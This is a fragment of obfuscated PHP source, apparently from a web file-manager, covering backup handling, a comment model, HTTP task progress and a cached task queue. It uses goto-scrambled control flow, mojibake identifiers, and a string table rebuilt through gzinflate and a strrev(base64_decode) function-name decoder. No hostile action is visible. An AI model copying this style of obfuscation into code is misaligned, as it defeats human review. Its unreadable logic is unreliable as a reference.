(isset($eÌ¿ê£³­[$BÂòÂöô®[207]])) { $eÌ¿ê£³­[$BÂòÂöô®[207]] = json_decode($eÌ¿ê£³­[$BÂòÂöô®[207]], !0); } goto EÍ£ò“Á; cÜ™Ù§Ó‰¹: Action($BÂòÂöô®[1714])->taskInit(); Model($BÂòÂöô®[1496])->cacheClear(); $C¤¡Ù¹šËˆ = $BÂòÂöô®[1715]; goto Céë†×»ç; D²ä‡îá†˜: $Fƒ¨ùÙƒ³’ = is_array($Fƒ¨ùÙƒ³’) ? $Fƒ¨ùÙƒ³’ : array(); if (!isset($Fƒ¨ùÙƒ³’[$BÂòÂöô®[723]])) { $Fƒ¨ùÙƒ³’[$BÂòÂöô®[723]] = $BÂòÂöô®[97]; } unset($Fƒ¨ùÙƒ³’[$BÂòÂöô®[1497]]); goto cÜ™Ù§Ó‰¹; a­ğÑæŸ³¯: } public function listData($e¤¯…¹ØôÕ = false, $BÜø—®Ğ‹° = "\x6d\x6f\144\151\146\171\124\x69\155\x65", $dÀŒç±½ã¹ = false) { return parent::listData($e¤¯…¹ØôÕ, $BÜø—®Ğ‹°, !0); } public function lastItem() { $BõÉÏ²ä¶· = $this->listData(); return !empty($BõÉÏ²ä¶·[0]) ? $BõÉÏ²ä¶·[0] : null; } public function kill($CÈğ»­²‚) { goto fğƒ‹îè¶; FÎ¢Ã‚–¸È: $cÒåó•¼¿š = $dî½£é…ğè[$DÁñßùí½×[38]]; $CÕƒ¯àÎŞø = TEMP_FILES . $DÁñßùí½×[746] . $cÒåó•¼¿š . $DÁñßùí½×[18]; IO::remove($CÕƒ¯àÎŞø, !1); goto dÖÈ»óöŞ; dÖÈ»óöŞ: return $this->remove($CÈğ»­²‚); goto BÕãÔ…‚³; fğƒ‹îè¶: $DÁñßùí½× =& $_SERVER[£¶ä½¶¢]; $dî½£é…ğè = $this->listData($CÈğ»­²‚); if (!$dî½£é…ğè || empty($dî½£é…ğè[$DÁñßùí½×[38]])) { return !0; } goto f„å‹Å‡Š; f„å‹Å‡Š: Task::kill($DÁñßùí½×[749]); Task::kill($DÁñßùí½×[772]); Task::kill($DÁñßùí½×[782]); goto FÎ¢Ã‚–¸È; BÕãÔ…‚³: } public function remove($B¶îÌ­Ş—) { $fæŞ‘”£…÷ = $this->listData($B¶îÌ­Ş—); if (!$fæŞ‘”£…÷) { return !0; } return $this->backupRemove($fæŞ‘”£…÷); } private function backupRemove($DìÁ¯­ÍÉ) { parent::remove($DìÁ¯­ÍÉ[$_SERVER[£¶ä½¶¢][401]]); $EÒ“Ù¿ÚÊ§ = $this->backupPath($DìÁ¯­ÍÉ); IO::remove($EÒ“Ù¿ÚÊ§, !1); return !0; } private function backupPath($DË¯ö×»Ş¬) { $aŒ“–¼ÙÄ• =& $_SERVER[£¶ä½¶¢]; $Aˆ·—„ëî = $DË¯ö×»Ş¬[$aŒ“–¼ÙÄ•[38]]; $Dñ±êÛÅ¶ = Model($aŒ“–¼ÙÄ•[738])->get($aŒ“–¼ÙÄ•[739]); $D“×¬µ…Ÿ = substr(md5($aŒ“–¼ÙÄ•[740] . $Dñ±êÛÅ¶ . $Aˆ·—„ëî), 0, 8); return "\173\x69\157\72{$DË¯ö×»Ş¬[$aŒ“–¼ÙÄ•[720]]}\175\57\x64\x61\x74\x61\x62\x61\163\145\57\142\141\x63\153\165\x70\x2f" . $Aˆ·—„ëî . $aŒ“–¼ÙÄ•[81] . $D“×¬µ…Ÿ; } public function start() { goto CÂ¿¸ö÷Í°; Cá±—îÓŠ–: $eæù°Õ‚ÔÇ = new Backup(); $dÕÆÌ‹¥î¶ = $eæù°Õ‚ÔÇ->db(); if ($dÕÆÌ‹¥î¶) { $dÕÆÌ‹¥î¶ = $eæù°Õ‚ÔÇ->dbFile(); if ($dÕÆÌ‹¥î¶ && $eÌ÷ª¯Æï[$a°šÃ‰³”»[723]] == $a°šÃ‰³”»[201]) { $dÕÆÌ‹¥î¶ = $eæù°Õ‚ÔÇ->file(); } } goto F÷êËÁ«Æ; eË¥í„: if (!$eÌ÷ª¯Æï || $eÌ÷ª¯Æï[$a°šÃ‰³”»[1497]] != $a°šÃ‰³”»[97]) { return !1; } $EÍ…†Ï¹‡Å = $this->process(); foreach ($EÍ…†Ï¹‡Å as $F™ìšÈÙä) { if ($F™ìšÈÙä) { return Task::restart($F™ìšÈÙä[$a°šÃ‰³”»[401]]); } } goto Cá±—îÓŠ–; F÷êËÁ«Æ: Backup::set(array($a°šÃ‰³”»[718] => 1, $a°šÃ‰³”»[484] => time())); return !0; goto Eê¾åœò¬; CÂ¿¸ö÷Í°: $a°šÃ‰³”» =& $_SERVER[£¶ä½¶¢]; if ($GLOBALS[$a°šÃ‰³”»[16]][$a°šÃ‰³”»[98]][$a°šÃ‰³”»[1717]] != $a°šÃ‰³”»[97]) { return !0; } $eÌ÷ª¯Æï = $this->config(); goto eË¥í„; Eê¾åœò¬: } public function process() { $bğØ§Áï¼ =& $_SERVER[£¶ä½¶¢]; return array($bğØ§Áï¼[726] => Task::get($bğØ§Áï¼[749]), $bğØ§Áï¼[730] => Task::get($bğØ§Áï¼[772]), $bğØ§Áï¼[203] => Task::get($bğØ§Áï¼[782])); } public function restore() { $c§Ö’´ˆ‘Á =& $_SERVER[£¶ä½¶¢]; ActionCall($c§Ö’´ˆ‘Á[1016], !0, 1); ActionCall($c§Ö’´ˆ‘Á[1016], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\156\164"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\155\x65" => "\x63\x6f\x6d\155\145\156\164\x5f\x6d\x65\x74\x61", "\x6d\x65\164\x61\x46\151\145\x6c\x64" => "\143\157\x6d\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($AÎæ´ùèƒ) { $EÇá‹µ‹¢Ø =& $_SERVER[£¶ä½¶¢]; if ($AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[1718]]) { $c¢¸ØÄ¤¬‡ = $this->where(array($EÇá‹µ‹¢Ø[1719] => $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[1718]]))->find(); if (!$c¢¸ØÄ¤¬‡ || $c¢¸ØÄ¤¬‡[$EÇá‹µ‹¢Ø[412]] != $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[412]] || $c¢¸ØÄ¤¬‡[$EÇá‹µ‹¢Ø[492]] != $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[492]]) { return !1; } $this->where(array($EÇá‹µ‹¢Ø[1719] => $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[1718]]))->setAdd($EÇá‹µ‹¢Ø[1720], 1); } $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[1721]] = 0; $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[1720]] = 0; $AÎæ´ùèƒ[$EÇá‹µ‹¢Ø[718]] = 1; return $this->add($AÎæ´ùèƒ); } public function commentCount($f¯§ÔÉ®©², $F±áŠ¯İßÖ) { goto D‰ÏÁº¹Û; D‰ÏÁº¹Û: $BØ»â¸ö¬¢ =& $_SERVER[£¶ä½¶¢]; if (!$f¯§ÔÉ®©²) { return array(); } if (is_string($f¯§ÔÉ®©²) || is_int($f¯§ÔÉ®©²)) { $f¯§ÔÉ®©² = array($f¯§ÔÉ®©²); } goto AøŒ®çª; AøŒ®çª: $E«§šÅ×é« = array($BØ»â¸ö¬¢[492], $BØ»â¸ö¬¢[1722] => $BØ»â¸ö¬¢[488]); $e¨ËšŠÕ¼ = array($BØ»â¸ö¬¢[492] => array($BØ»â¸ö¬¢[17], $f¯§ÔÉ®©²), $BØ»â¸ö¬¢[412] => $F±áŠ¯İßÖ); $f¹ÜÆ‹ = $this->field($E«§šÅ×é«)->where($e¨ËšŠÕ¼)->group($BØ»â¸ö¬¢[492])->select(); goto d³ç«¹Ä”Â; d³ç«¹Ä”Â: return array_to_keyvalue($f¹ÜÆ‹, $BØ»â¸ö¬¢[492], $BØ»â¸ö¬¢[488]); goto Aƒ£˜ˆÀù»; Aƒ£˜ˆÀù»: } public function remove($fŞ¢Æ÷›«÷) { $côƒ÷ŠƒŠã =& $_SERVER[£¶ä½¶¢]; $cÛ©Ó¿ùíÂ = array($côƒ÷ŠƒŠã[1719] => $fŞ¢Æ÷›«÷); $aŒô‹ĞÇŞ = $this->where($cÛ©Ó¿ùíÂ)->find(); if ($aŒô‹ĞÇŞ[$côƒ÷ŠƒŠã[1718]]) { $this->where(array($côƒ÷ŠƒŠã[1719] => $aŒô‹ĞÇŞ[$côƒ÷ŠƒŠã[1718]]))->setAdd($côƒ÷ŠƒŠã[1720], -1); } return $this->where($cÛ©Ó¿ùíÂ)->delete(); } public function edit($d‰’ì›Â”¾, $bªƒéÎñ¶) { $d–í‚Ïáö– =& $_SERVER[£¶ä½¶¢]; $e®˜¨ãˆ› = array($d–í‚Ïáö–[1719] => $d‰’ì›Â”¾); return $this->where($e®˜¨ãˆ›)->save(array($d–í‚Ïáö–[1723] => $bªƒéÎñ¶)); } public function prasise($dáã†ù¿À) { $d‹„Ìä’´Á =& $_SERVER[£¶ä½¶¢]; $f°Ñ§Ş„Ö¥ = Model($d‹„Ìä’´Á[1724]); $EŒ‡‡ï”Õâ = array($d‹„Ìä’´Á[1719] => $dáã†ù¿À, $d‹„Ìä’´Á[1518] => USER_ID); $fùÏÕåõê = $f°Ñ§Ş„Ö¥->where($EŒ‡‡ï”Õâ)->find(); if (!$fùÏÕåõê) { $f°Ñ§Ş„Ö¥->add($EŒ‡‡ï”Õâ); $aÍ“”Ì«Œ› = $this->where(array($d‹„Ìä’´Á[1719] => $dáã†ù¿À))->setAdd($d‹„Ìä’´Á[1721], 1); } else { $f°Ñ§Ş„Ö¥->where($EŒ‡‡ï”Õâ)->delete(); $aÍ“”Ì«Œ› = $this->where(array($d‹„Ìä’´Á[1719] => $dáã†ù¿À))->setAdd($d‹„Ìä’´Á[1721], -1); } return $aÍ“”Ì«Œ›; } public function targetInfo($b¡É±¥ë, $C­“Î„¥É) { goto bíØìõÖ; EÀ·ñ—Æ‚Á: $BÛƒá™ ËÂ = "\122\x49\x47\x48\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\x74\x5f\160\162\x61\151\163\145\40\163\164\x61\x72\x20\157\x6e\x20\143\157\x6d\155\x65\x6e\x74\x2e\143\x6f\x6d\155\145\156\x74\111\x44\40\75\x20\x73\164\141\162\56\x63\x6f\x6d\x6d\145\156\x74\x49\104"; $dİ¤ë“‰Œ° = $this->alias($dïÑ¨Ûµ–ø[361])->where($FŸ‹ˆ‰¼°­)->join($BÛƒá™ ËÂ, $dïÑ¨Ûµ–ø[1725])->count(); $fò•¥ß¿…† = array($dïÑ¨Ûµ–ø[1726] => $F‘µÊ²è¾², $dïÑ¨Ûµ–ø[1727] => $dİ¤ë“‰Œ°); goto C‹ÑŠŠ•·ª; bíØìõÖ: $dïÑ¨Ûµ–ø =& $_SERVER[£¶ä½¶¢]; $FŸ‹ˆ‰¼°­ = array($dïÑ¨Ûµ–ø[557] => $b¡É±¥ë, $dïÑ¨Ûµ–ø[558] => $C­“Î„¥É); $F‘µÊ²è¾² = $this->where($FŸ‹ˆ‰¼°­)->count(); goto EÀ·ñ—Æ‚Á; C‹ÑŠŠ•·ª: return $fò•¥ß¿…†; goto AÓÁå™«Ÿ÷; AÓÁå™«Ÿ÷: } public function listData($Eøô£æÛ¸) { $BÍÁ¯ˆ‹Ú =& $_SERVER[£¶ä½¶¢]; if (isset($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1728]])) { if ($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1728]]) { $Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1729]] = array($BÍÁ¯ˆ‹Ú[969], intval($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1728]])); } unset($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1728]]); } if (isset($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1730]])) { if ($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1730]]) { $Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1729]] = array($BÍÁ¯ˆ‹Ú[966], intval($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1730]])); } unset($Eøô£æÛ¸[$BÍÁ¯ˆ‹Ú[1730]]); } return $this->_listData($Eøô£æÛ¸); } private function _listData($b•Ñ£ìéâã) { $cÀñŠÎÖ‡ï =& $_SERVER[£¶ä½¶¢]; $a‰Á›ƒÏ­ƒ = $this->where($b•Ñ£ìéâã)->_makeOrder()->selectPage(100); $this->_listAppendParent($a‰Á›ƒÏ­ƒ[$cÀñŠÎÖ‡ï[376]]); $this->_listAppendUser($a‰Á›ƒÏ­ƒ[$cÀñŠÎÖ‡ï[376]]); $this->_listAppendMeta($a‰Á›ƒÏ­ƒ[$cÀñŠÎÖ‡ï[376]]); return $a‰Á›ƒÏ­ƒ; } private function _makeOrder() { $dóÌá²Œóæ =& $_SERVER[£¶ä½¶¢]; $Aœ»¦‚¸Êå = array($dóÌá²Œóæ[1721], $dóÌá²Œóæ[1720], $dóÌá²Œóæ[204]); $EÌ®ÀâÎö = Input::get($dóÌá²Œóæ[443], $dóÌá²Œóæ[17], $dóÌá²Œóæ[424], $Aœ»¦‚¸Êå); $AŸÇƒ‹Öé = Input::get($dóÌá²Œóæ[444], $dóÌá²Œóæ[17], $dóÌá²Œóæ[1520], array($dóÌá²Œóæ[1731], $dóÌá²Œóæ[439])); $bì½Åñ‡ŠŸ = $EÌ®ÀâÎö . $dóÌá²Œóæ[60] . $AŸÇƒ‹Öé; return $this->order($bì½Åñ‡ŠŸ); } private function _listAppendParent(&$b§ñˆõ¦“) { goto f ‘¦âæÀ¯; bóö‘œ—º: foreach ($b§ñˆõ¦“ as &$BÎ›ø®¢—å) { if (isset($aÆÍ«ß©ÀŞ[$BÎ›ø®¢—å[$f†äéŸã[1718]]])) { $BÎ›ø®¢—å[$f†äéŸã[1732]] = $aÆÍ«ß©ÀŞ[$BÎ›ø®¢—å[$f†äéŸã[1718]]]; } } unset($BÎ›ø®¢—å); goto aâœÈô‹Ë; d«Š™æ³: if (!$dÚ‰á„†¡ˆ) { return; } $aÆÍ«ß©ÀŞ = $this->where(array($f†äéŸã[1719] => array($f†äéŸã[17], $dÚ‰á„†¡ˆ)))->select(); $aÆÍ«ß©ÀŞ = array_to_keyvalue($aÆÍ«ß©ÀŞ, $f†äéŸã[1729]); goto bóö‘œ—º; f ‘¦âæÀ¯: $f†äéŸã =& $_SERVER[£¶ä½¶¢]; $dÚ‰á„†¡ˆ = array_unique(array_to_keyvalue($b§ñˆõ¦“, $f†äéŸã[43], $f†äéŸã[1718])); $dÚ‰á„†¡ˆ = array_remove_value($dÚ‰á„†¡ˆ, $f†äéŸã[201]); goto d«Š™æ³; aâœÈô‹Ë: } private function _listAppendUser(&$fŞ¿±ÔÉ) { goto EÑ±¯¡Şƒ; Cä±ƒ¹‘¿: foreach ($fŞ¿±ÔÉ as &$FÍŞç‚ÀÕ) { $FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[570]] = $b—ÓÊê³»ç[$FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1526]]]; if (isset($FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1732]])) { $FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1732]][$dæ²ÍÎÔ‰‚[570]] = $b—ÓÊê³»ç[$FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1732]][$dæ²ÍÎÔ‰‚[1526]]]; } } unset($FÍŞç‚ÀÕ); goto C»î±„ÑìÑ; Eİ­‰¼´ôÂ: if (count($d­ÀÆÔ–Ã) == 0) { return; } foreach ($fŞ¿±ÔÉ as $FÍŞç‚ÀÕ) { if (isset($FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1732]])) { $d­ÀÆÔ–Ã[] = $FÍŞç‚ÀÕ[$dæ²ÍÎÔ‰‚[1732]][$dæ²ÍÎÔ‰‚[1526]]; } } $b—ÓÊê³»ç = Model($dæ²ÍÎÔ‰‚[514])->userListInfo($d­ÀÆÔ–Ã); goto Cä±ƒ¹‘¿; EÑ±¯¡Şƒ: $dæ²ÍÎÔ‰‚ =& $_SERVER[£¶ä½¶¢]; $d­ÀÆÔ–Ã = array_unique(array_to_keyvalue($fŞ¿±ÔÉ, $dæ²ÍÎÔ‰‚[43], $dæ²ÍÎÔ‰‚[1526])); $d­ÀÆÔ–Ã = array_remove_value($d­ÀÆÔ–Ã, $dæ²ÍÎÔ‰‚[201]); goto Eİ­‰¼´ôÂ; C»î±„ÑìÑ: } private function _listAppendMeta(&$CÚëĞáôÈ) { goto fš®áë‡Æ; fš®áë‡Æ: $Fãë±Äæ =& $_SERVER[£¶ä½¶¢]; $EÚÖì¡òàÛ = array_unique(array_to_keyvalue($CÚëĞáôÈ, $Fãë±Äæ[43], $Fãë±Äæ[1729])); $EÚÖì¡òàÛ = array_remove_value($EÚÖì¡òàÛ, $Fãë±Äæ[201]); goto aÉ³Ğ©«‹—; aÉ³Ğ©«‹—: if (!$EÚÖì¡òàÛ) { return; } foreach ($CÚëĞáôÈ as $B§Âæ–Î³) { if (isset($B§Âæ–Î³[$Fãë±Äæ[1732]])) { $EÚÖì¡òàÛ[] = $B§Âæ–Î³[$Fãë±Äæ[1732]][$Fãë±Äæ[1729]]; } } $b”å¬£Æï = $this->metaList($EÚÖì¡òàÛ); goto dî“–Ç›; dî“–Ç›: if (!$b”å¬£Æï) { return !1; } foreach ($CÚëĞáôÈ as &$B§Âæ–Î³) { $B§Âæ–Î³[$Fãë±Äæ[453]] = $b”å¬£Æï[$B§Âæ–Î³[$Fãë±Äæ[1729]]]; if (isset($B§Âæ–Î³[$Fãë±Äæ[1732]])) { $B§Âæ–Î³[$Fãë±Äæ[1732]][$Fãë±Äæ[453]] = $b”å¬£Æï[$B§Âæ–Î³[$Fãë±Äæ[1732]][$Fãë±Äæ[1729]]]; } } unset($B§Âæ–Î³); goto A§âÉÊ¼»‚; A§âÉÊ¼»‚: } private function metaList($CÎ‹Òºœ‡) { goto eìá²é´Ÿº; E¬ëáĞ¢à: return $fò§»é¼»é ? $fò§»é¼»é : array(); goto f’—ÀöÌ’ï; F½Ş¸‰Å·è: $fò§»é¼»é = Model($fÕª¯õÔ‚ô[1733])->where($BĞ‹ÄÍ²Úš)->select(); $fò§»é¼»é = array_to_keyvalue_group($fò§»é¼»é, $fÕª¯õÔ‚ô[1729]); foreach ($fò§»é¼»é as $D¾å‘Ñõì => $d’ÍØ©ëå¡) { $dé¡Âì– = array(); foreach ($d’ÍØ©ëå¡ as $Aˆ¿É¬­³ç) { $dé¡Âì–[$Aˆ¿É¬­³ç[$fÕª¯õÔ‚ô[103]]] = $Aˆ¿É¬­³ç[$fÕª¯õÔ‚ô[381]]; } $fò§»é¼»é[$D¾å‘Ñõì] = $dé¡Âì–; } goto E¬ëáĞ¢à; eìá²é´Ÿº: $fÕª¯õÔ‚ô =& $_SERVER[£¶ä½¶¢]; if (!$CÎ‹Òºœ‡) { return array(); } $BĞ‹ÄÍ²Úš = array($fÕª¯õÔ‚ô[1729] => array($fÕª¯õÔ‚ô[17], $CÎ‹Òºœ‡)); goto F½Ş¸‰Å·è; f’—ÀöÌ’ï: } } goto C½ï¡ºë¼Í; e¾ŠëƒãŒ: $e…âæ¶ÌÅÔ = strrev(base64_decode($_SERVER[ší³ÛË][0])); function binCheckNeq($Eê’ßŒæï­, $EÈ¨Ô¸‹) { return $Eê’ßŒæï­ != $EÈ¨Ô¸‹; } $_SERVER[$_SERVER[ší³ÛË][1]] = $e…âæ¶ÌÅÔ($_SERVER[$_SERVER[ší³ÛË][2]]); goto dŠçæùøˆ; e¸éáÇËñ: define($_SERVER[£¶ä½¶¢][0], $_SERVER[£¶ä½¶¢][1]); $_SERVER[ší³ÛË] = explode($_SERVER[£¶ä½¶¢][2], gzinflate(substr($_SERVER[£¶ä½¶¢][3], 10, -8))); function binCheckEq($EŒå«çÏ„¬, $ešãÆ„ï›¬) { return $EŒå«çÏ„¬ == $ešãÆ„ï›¬; } goto e¾ŠëƒãŒ; aÁÃ§ßİë¶: class TaskHttp extends Task { protected function startAfter() { $BÕÜÔŞĞ˜â =& $_SERVER[£¶ä½¶¢]; $cá²—Ò©ìµ =& $this->task; $cá²—Ò©ìµ[$BÕÜÔŞĞ˜â[1590]] = 1; Hook::bind($BÕÜÔŞĞ˜â[1562], array($this, $BÕÜÔŞĞ˜â[1591])); Hook::bind($BÕÜÔŞĞ˜â[1564], array($this, $BÕÜÔŞĞ˜â[1592])); Hook::bind($BÕÜÔŞĞ˜â[1566], array($this, $BÕÜÔŞĞ˜â[1593])); } protected function endAfter() { $f¾Œ ©¥‚ =& $_SERVER[£¶ä½¶¢]; Hook::unbind($f¾Œ ©¥‚[1562], array($this, $f¾Œ ©¥‚[1591])); Hook::unbind($f¾Œ ©¥‚[1564], array($this, $f¾Œ ©¥‚[1592])); Hook::unbind($f¾Œ ©¥‚[1566], array($this, $f¾Œ ©¥‚[1593])); } public function progressStart($bœµ‹‡÷‡) { $b–¸ÆĞ‡â¡ =& $_SERVER[£¶ä½¶¢]; $Fñ¿ŒÖ»·Ô = curl_getinfo($bœµ‹‡÷‡); self::log($b–¸ÆĞ‡â¡[1594] . $Fñ¿ŒÖ»·Ô[$b–¸ÆĞ‡â¡[314]]); self::valueSet($this->task[$b–¸ÆĞ‡â¡[401]], $this->task); } public function progressEnd($fÎ²²©Š·ù) { $d‘íâËŠ¢ª =& $_SERVER[£¶ä½¶¢]; self::log($d‘íâËŠ¢ª[1595] . $this->task[$d‘íâËŠ¢ª[401]]); $this->end(); } public function progress($B‡ñŸº§·’, $b«ø ô±éÔ, $b£ñŠ’œÍ¶, $c¥¬¥×‡ë¦, $DÓé¼‘–Ş) { $A¾È£´‹°£ =& $_SERVER[£¶ä½¶¢]; $FïÇëë·¶í =& $this->task; if ($DÓé¼‘–Ş > 0) { $FïÇëë·¶í[$A¾È£´‹°£[1019]] = $FïÇëë·¶í[$A¾È£´‹°£[1019]] == 0 ? $c¥¬¥×‡ë¦ : $FïÇëë·¶í[$A¾È£´‹°£[1019]]; $FïÇëë·¶í[$A¾È£´‹°£[1034]] = $DÓé¼‘–Ş; } else { if ($b£ñŠ’œÍ¶ > 0) { $FïÇëë·¶í[$A¾È£´‹°£[1019]] = $FïÇëë·¶í[$A¾È£´‹°£[1019]] == 0 ? $b«ø ô±éÔ : $FïÇëë·¶í[$A¾È£´‹°£[1019]]; $FïÇëë·¶í[$A¾È£´‹°£[1034]] = $b£ñŠ’œÍ¶; } } $this->update(); self::log("\160\x72\157\147\x72\145\x73\x73\x48\x74\164\x70\72\x64\x6f\x77\156\x3a{$b£ñŠ’œÍ¶}\57{$b«ø ô±éÔ}\x3b\40\165\x70\x6c\x6f\141\x64\x3a{$DÓé¼‘–Ş}\57{$c¥¬¥×‡ë¦}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\121\x75\145\165\145\114\145\156\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\x65\165\x65\x44\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($c¯ÌÔˆæéİ, $eØªïƒÄĞÈ = array(), $cœˆÌƒŞ¿¡ = '', $Dàí®×•È = '') { $f‘İˆ†Ù©İ =& $_SERVER[£¶ä½¶¢]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Dàí®×•È && array_find_by_field(self::$listData, $f‘İˆ†Ù©İ[103], $Dàí®×•È)) { return !0; } self::$listData[] = array($f‘İˆ†Ù©İ[271] => $c¯ÌÔˆæéİ, $f‘İˆ†Ù©İ[1596] => $eØªïƒÄĞÈ, $f‘İˆ†Ù©İ[439] => $cœˆÌƒŞ¿¡, $f‘İˆ†Ù©İ[103] => $Dàí®×•È); return !0; } public static function addSubmit() { $cÔµ‰§â¹Ù =& $_SERVER[£¶ä½¶¢]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($cÔµ‰§â¹Ù[1597] . json_encode_force(array_to_keyvalue(self::$listData, $cÔµ‰§â¹Ù[43], $cÔµ‰§â¹Ù[439])), $cÔµ‰§â¹Ù[1598]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($få¿ˆĞÓö, $dïÎˆ”ß†‚ = array(), $d¶–ø–Æ› = '', $BèªÃˆ¤‹Ä = '') { goto e¿³×÷ù„¼; b…çÚ«¿ë: self::setAll($fåñİÃ¨í¿); return !0; goto FÜã¤ğ§¬Õ; e¿³×÷ù„¼: $Aâá¿¤šÃ =& $_SERVER[£¶ä½¶¢]; if (self::count() >= self::MAX_LENGTH) { return !1; } $fåñİÃ¨í¿ = self::getAll(); goto D½´Èç‚ƒ„; D½´Èç‚ƒ„: if ($BèªÃˆ¤‹Ä && array_find_by_field($fåñİÃ¨í¿, $Aâá¿¤šÃ[103], $BèªÃˆ¤‹Ä)) { return !0; } $fåñİÃ¨í¿[] = array($Aâá¿¤šÃ[271] => $få¿ˆĞÓö, $Aâá¿¤šÃ[1596] => $dïÎˆ”ß†‚, $Aâá¿¤šÃ[439] => $d¶–ø–Æ›, $Aâá¿¤šÃ[103] => $BèªÃˆ¤‹Ä); write_log($Aâá¿¤šÃ[1597] . $d¶–ø–Æ›, $Aâá¿¤šÃ[1598]); goto b…çÚ«¿ë; FÜã¤ğ§¬Õ: } public static function run() { goto d‰£·‹Ê•‰; dÂõáëä¯: if (!$e ´‚˜ô˜) { return !1; } self::setAll($f±ñˆäƒŒ¦); $e‡èöåîĞ· = timeFloat(); goto dŒÔè†Ü­É; dŒÔè†Ü­É: try { Hook::apply($e ´‚˜ô˜[$BÇÃÏ¡…êÖ[271]], $e ´‚˜ô˜[$BÇÃÏ¡…êÖ[1596]]); } catch (Exception $FÛåŞ´ÊÔ) { } $eçëÏù¤¼Ù = number_format(timeFloat() - $e‡èöåîĞ·, 3) . $BÇÃÏ¡…êÖ[1539]; write_log($BÇÃÏ¡…êÖ[1599] . $e ´‚˜ô˜[$BÇÃÏ¡…êÖ[439]] . $BÇÃÏ¡…êÖ[1600] . $eçëÏù¤¼Ù, $BÇÃÏ¡…êÖ[1598]); goto bÜ¢îÄá“; d‰£·‹Ê•‰: $BÇÃÏ¡…êÖ =& $_SERVER[£¶ä½¶¢]; $f±ñˆäƒŒ¦ = self::getAll(); $e ´‚˜ô˜ = array_shift($f±ñˆäƒŒ¦); goto dÂõáëä¯; bÜ¢îÄá“: return !0; goto DÂ­×œ¶å¿; DÂ­×œ¶å¿: } public static function count() { $A¸Áá¯ÊÇ¦ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$A¸Áá¯ÊÇ¦) { return 0; } return intval($A¸Áá¯ÊÇ¦); } public static function getAll() { $eò±–ÇÚì“ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$eò±–ÇÚì“) { return array(); } return $eò±–ÇÚì“; } public static function setAll($eíœ½ÅôÑ) { $eŠƒ‹Å¸“ˆ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($eíœ½ÅôÑ), $eŠƒ‹Å¸“ˆ); Cache::set(self::QUEUE_DATA, $eíœ½ÅôÑ, $eŠƒ‹Å¸“ˆ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($e¨…‰•œÊ, $C—ò‡ŞÕÒ = 5.0) { if (!$e¨…‰•œÊ) { return; } $aæÂ¢«£… = Cache::get($e¨…‰•œÊ); if (!$aæÂ¢«£… || timeFloat() - floatVal($aæÂ¢«£…) >= $C—ò‡ŞÕÒ) { Cache::set($e¨…‰•œÊ, timeFloat(), $C—ò‡ŞÕÒ * 10); return !0; } return !1; } public static function timeLimitCall($b¬ºìê¶ÊÎ, $aÖª²…°ß, $F™“§ØÂğ, $BÂùŠÃÉí = 5.0) { goto dÏÛ¡Øƒ–È; dÏÛ¡Øƒ–È: $EˆÎ±…¸â =& $_SERVER[£¶ä½¶¢]; if (!$b¬ºìê¶ÊÎ || !$aÖª²…°ß) { return; } self::$asyncAdd = !0; goto c¹¶ÌëÔ£•; c«äšùØòÊ: Cache::set($d±Ôò‰ØŒë, $c¡¢â›…‹Š, 60); Cache::removeMemory($d±Ôò‰ØŒë); write_log($EˆÎ±…¸â[1604] . $b¬ºìê¶ÊÎ . $EˆÎ±…¸â[78] . $aÖª²…°ß, $EˆÎ±…¸â[1598]); goto Fš¿‘ƒíã; C÷Œùˆì‡ô: if (is_array($c¡¢â›…‹Š[$b¬ºìê¶ÊÎ])) { $e“¿˜¯¢ØÜ[$EˆÎ±…¸â[1603]] = $c¡¢â›…‹Š[$b¬ºìê¶ÊÎ][$EˆÎ±…¸â[1603]]; } if (is_array($c¡¢â›…‹Š[$b¬ºìê¶ÊÎ])) { if (timeFloat() - $c¡¢â›…‹Š[$b¬ºìê¶ÊÎ][$EˆÎ±…¸â[1602]] < $e“¿˜¯¢ØÜ[$EˆÎ±…¸â[207]] * 0.3) { return; } 